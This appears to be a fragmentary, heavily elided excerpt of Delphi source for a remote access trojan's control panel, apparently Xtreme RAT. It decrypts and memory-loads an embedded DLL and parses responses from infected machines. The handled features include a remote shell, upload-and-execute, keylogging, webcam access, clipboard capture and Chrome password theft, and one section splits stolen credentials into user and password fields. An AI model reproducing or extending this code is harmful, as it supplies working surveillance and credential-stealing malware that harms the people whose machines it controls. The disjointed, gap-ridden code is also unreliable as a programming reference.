...
type
  ...
  public
    ...
    CloseToSysTray, MinimizeToSysTray, VNotify, SNotify, EnabledSkin,
      ShowDeskPreview, ShowThumbPreview, AutoDesktop, AutoWebcam, AutoAudio: boolean;
...
type
  _InsertServer = function(TV: TVirtualStringTree; InsertInto: pVirtualNode; Obj: TObject): pVirtualNode;
  _GetPrivateID = function: string;

var
  InsertServer: _InsertServer;
  GetPrivateID: _GetPrivateID;
var
  FormMain: TFormMain;
...
begin
  d := now;
  Result := Copy(DateTimeToStr(d), 1, pos(' ', DateTimeToStr(d) + ' ') - 1);
end;
...
begin
  ...
  try
    ...
    if not InputBufferIsEmpty then try TempStr := ReadLn except TempStr := '' end;
    except
  end;

  if pos(IntToStr(ConnectionPass) + '.functions', TempStr) > 0 then
  begin
    ...
    MaxConnectionHttp := MaxConnectionHttp - 1;
  end else if pos(MYVERSION, TempStr) > 0 then
  begin
    Randomize;
    ...
    ConAux.Node := nil;
    ConAux.BrotherID := '';
    ConAux.ConnectionID := TempStr + MD5.MD5Print(MD5.MD5String(GetPrivateID));
    ConAux.Connection.IOHandler.DefStringEncoding := TIdTextEncoding.UTF8;
...
begin
  ...
  resStream := TResourceStream.Create(hInstance, 'INSERTSERVER', 'insertserverfile');
  resStream.Position := 0;
  SetLength(s, resStream.Size div 2);
  resStream.Read(s[1], resStream.Size);

  //desencriptar...
  EnDecryptStrRC4B(@s[1], Length(s) * 2, 'XTREME');

  MemoryModule := BTMemoryLoadLibary(@s[1]);
  @InsertServer := BTMemoryGetProcAddress(MemoryModule, 'InsertServer');
  @GetPrivateID := BTMemoryGetProcAddress(MemoryModule, 'GetPrivateID');
  resStream.Free;
  ...
  begin
    ...
    begin
      ...
      begin
        ...
        if (sFrameBar1.Visible) and (ConAux.Node.CheckState = csCheckedNormal) then
          ConAux.EnviarString(GETDESKTOPPREVIEW + '|' + IntToStr(DesktopSize) + '|');

        if (ShowThumbPreview = true) and (ConAux.Node.CheckState = csCheckedNormal) then
...
begin
  if (FormConnectionsLog.RadioGroup1.ItemIndex = 0) or
     (pos(Today, DateTimeToStr(FormConnectionsLog.sMonthCalendar1.CalendarDate)) > 0) then
  begin
  ...
  begin
    ...
    begin
      ...
      begin
        ...
        begin
          NovaJanelaWebcam.ComboBox1.Items.Add(Copy(TempStr, 1, pos('|', TempStr) - 1));
...
begin
  ...
  StatusBar1.Panels.Items[2].Text := Traduzidos[26] + ': ' + Copy(ExtractFileName(LangFile), 1, pos('.', ExtractFileName(LangFile)) - 1);
...
*)
  ...
  begin
    ...
    NameServer := Copy(TempStr, 1, pos(delimitadorComandos, TempStr) - 1);
    Delete(TempStr, 1, pos(delimitadorComandos, TempStr) - 1);
    Delete(TempStr, 1, length(delimitadorComandos));

    FlagID := StrToInt(Copy(TempStr, 1, pos('|', TempStr) - 1));
    Delete(TempStr, 1, pos('|', TempStr));
  ...
  begin
    ...
    localip := GetIPAddress;
    while pos('|', PortList) > 0 do
    begin
      try
        i := StrToInt(copy(PortList, 1, pos('|', PortList) - 1));
        except
        i := 0;
      end;
      delete(PortList, 1, pos('|', PortList));
...
begin
  ...
  // Use a parte de baixo...
  ConAux.Node := InsertServer(FormMain.MainList, Node, TObject(ConAux));
...
begin
  ...
  if Copy(Recebido, 1, pos('|', Recebido) - 1) = NEWCONNECTION then
  begin
    ConAuxNewConnection := ConAux;
    ConAux := nil;

    Delete(Recebido, 1, pos('|', Recebido));
    TempID := Copy(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    ...
    ConAuxNewConnection.Connection.IOHandler.DefStringEncoding := TIdTextEncoding.UTF8;
  end;
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = WEBCAMLIST then
  begin
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = UPLOADANDEXECUTEYES then
  begin
    delete(recebido, 1, pos('|', recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = UPLOADANDEXECUTENO then
  begin
    delete(recebido, 1, pos('|', recebido));
    MessageBox(Handle, pchar(ConAux.NomeDoServidor + #13#10 +
  ...
  begin
    ...
    // abreviação + ' - ' + nome
    TempInt := GetCountryCode(copy(TempStr, 1, pos('-', TempStr) - 2));
    // código da bandeira
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = PROCESS then
  begin
    if ConAux.FormProcessos <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = JANELAS then
  begin
    if ConAux.FormWindows <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = SERVICOS then
  begin
    if ConAux.FormServices <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = CLIPBOARD then
  begin
    if ConAux.FormClipboard <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = SHELL then
  begin
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = FILEMANAGERNEW then
  begin
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = PROGRAMAS then
  begin
    if ConAux.FormProgramas <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = FDIVERSOS then
  begin
    if ConAux.FormDiversos <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = NEWFDIVERSOS then
  begin
    if ConAux.FormDiversos <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = DESKTOPNEW then
  begin
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = SERVERSETTINGS then
  begin
    if ConAux.FormServerSettings <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGERNEW then
  begin
    if (ConAux.FormKeylogger <> nil) and (ConAux.FormKeylogger.Visible = True) then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = UnitConstantes.MSN then
  begin
    if ConAux.FormMSN <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = CHROMEPASS then
  begin
    delete(recebido, 1, pos('|', recebido));
  ...
  begin
    ...
    begin
      Application.ProcessMessages;
      PassImage := GetPassImage(copy(recebido, 1, pos('|', recebido) - 1));
      delete(recebido, 1, pos('|', recebido));
      ...
      begin
        ...
        TipoSenha := Copy(TempStr1, 1, pos(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, pos(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, length(DelimitadorComandosPassword));

        UserSenha := Copy(TempStr1, 1, pos(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, pos(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, length(DelimitadorComandosPassword));

        PassSenha := Copy(TempStr1, 1, pos(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, pos(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, length(DelimitadorComandosPassword));
        ...
        if (
           ...
           (
            (pos('//', TipoSenha) <= 0) and
            (pos('microsoft_wininet', LowerCase(TipoSenha)) <= 0) and
            (pos('RAS Passwords', TipoSenha) <= 0)
           ) then Continue;
  ...
  if copy(recebido, 1, pos('|', recebido) - 1) = FILESEARCH then
  begin
    Application.ProcessMessages;
